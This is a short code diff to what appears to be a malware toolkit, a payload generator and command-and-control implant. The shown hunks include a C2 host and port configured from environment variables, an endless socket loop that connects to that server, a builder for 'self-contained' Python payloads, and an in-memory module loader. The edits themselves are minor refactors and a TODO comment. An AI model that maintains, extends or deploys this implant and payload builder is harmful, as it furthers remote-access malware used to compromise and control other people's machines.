@@ -58,7 +58,7 @@ class PayloadGenerationFixer:
             ]
             
             for cmd in cmds:
-                os.system(cmd)
+                subprocess.run(cmd, shell=True, capture_output=True)
                 
             # Check again
             result = subprocess.run(['which', 'wine'], capture_output=True)
@@ -160,6 +160,7 @@ def main():
     host = os.getenv('C2_HOST', '127.0.0.1')
     port = int(os.getenv('C2_PORT', '4040'))
     
+    # TODO: Ensure loop has proper exit condition
     while True:
         try:
             sock = socket.socket()
@@ -261,8 +262,7 @@ if __name__ == "__main__":
                         return file
                         
         print(f"  ✗ Compilation failed: {result.stderr[:500]}")
-        return None
-    
+        return
     def create_python_bundled_payload(self, source_dir, output_name='bundled_payload.py'):
         """Create a self-contained Python payload"""
         print("\n[BUNDLE] Creating bundled Python payload...")
@@ -287,8 +287,7 @@ class ModuleLoader:
     def find_module(self, name, path=None):
         if name in MODULES:
             return self
-        return None
-        
+        return
     def load_module(self, name):
         if name in sys.modules:
             return sys.modules[name]
